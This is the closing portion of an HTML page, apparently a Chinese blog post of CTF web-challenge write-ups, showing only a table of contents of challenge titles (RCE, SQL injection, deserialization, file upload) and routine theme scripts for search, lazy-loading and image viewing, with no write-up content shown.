class="toc-text">WEEK1|WEB-Begin of HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-errorflask"><span class="toc-text">WEEK1|WEB-ErrorFlask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-begin-of-php"><span class="toc-text">WEEK1|WEB-Begin of PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-rce"><span class="toc-text">WEEK1|WEB-R!C!E!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-easylogin"><span class="toc-text">WEEK1|WEB-EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2web-%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-text">WEEK2|WEB-æ¸¸æˆé«˜æ‰‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2web-include-0-0"><span class="toc-text">WEEK2|WEB-include 0ã€‚0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#convert%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">convertè½¬æ¢è¿‡æ»¤å™¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2web-ez_sql"><span class="toc-text">WEEK2|WEB-ez_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-text">æ–¹æ³•ä¸€ï¼šsqlmapä¸€æŠŠæ¢­</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">æ–¹æ³•äºŒï¼šæ‰‹å·¥æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2web-unserialize"><span class="toc-text">WEEK2|WEB-Unserializeï¼Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2web-upload-again"><span class="toc-text">WEEK2|WEB-Upload again!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2web-rce"><span class="toc-text">WEEK2|WEB-R!!C!!E!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3web-include"><span class="toc-text">WEEK3|WEB-Include ğŸ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3web-pop-gadget"><span class="toc-text">WEEK3|WEB-POP Gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3web-rce"><span class="toc-text">WEEK3|WEB-R!!!C!!!E!!!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80ls%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E8%AF%BB%E5%8F%96"><span class="toc-text">æ–¹æ³•ä¸€ï¼šlsç›´æ¥å†™å…¥è¯»å–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8Cbash%E7%9B%B2%E6%B3%A8"><span class="toc-text">æ–¹æ³•äºŒï¼šbashç›²æ³¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3web-medium_sql"><span class="toc-text">WEEK3|WEB-medium_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3web-genshin"><span class="toc-text">WEEK3|WEB-GenShin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3web-otenkigirl"><span class="toc-text">WEEK3|WEB-OtenkiGirl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-%E9%80%83"><span class="toc-text">WEEK4|WEB-é€ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-more-fast"><span class="toc-text">WEEK4|WEB-More Fast</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-more-fast-midsql"><span class="toc-text">WEEK4|WEB-More Fast-midsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-flask-disk"><span class="toc-text">WEEK4|WEB-flask disk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-injectme"><span class="toc-text">WEEK4|WEB-InjectMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-pharone"><span class="toc-text">WEEK4|WEB-PharOne</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4web-otenkiboy"><span class="toc-text">WEEK4|WEB-OtenkiBoy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5web-unserialize-again"><span class="toc-text">WEEK5|WEB-Unserialize Again</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5web-final"><span class="toc-text">WEEK5|WEB-Final</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5web-yes-pickle"><span class="toc-text">WEEK5|WEB-Yeâ€™s Pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5web-pppython"><span class="toc-text">WEEK5|WEB-pppython?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5web-4-%E5%A4%8D%E7%9B%98"><span class="toc-text">WEEK5|WEB-4-å¤ç›˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5web-nextdrive"><span class="toc-text">WEEK5|WEB-NextDrive</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x03 å‚è€ƒæ–‡ç« </span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>å›åˆ°é¡¶éƒ¨</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>å‚ä¸è®¨è®º</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `åˆšåˆš`,
      min: `åˆ†é’Ÿå‰`,
      hour: `å°æ—¶å‰`,
      day: `å¤©å‰`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // æ‡’åŠ è½½ css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // é»˜è®¤å¼‚æ­¥ï¼Œå¦‚æœéœ€è¦åŒæ­¥ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ {} å³å¯
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 ç­‰å¾… 1 å®Œæˆ 2 è¶…æ—¶
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('è¯·æ±‚è¶…æ—¶');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `å¤åˆ¶æˆåŠŸ`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
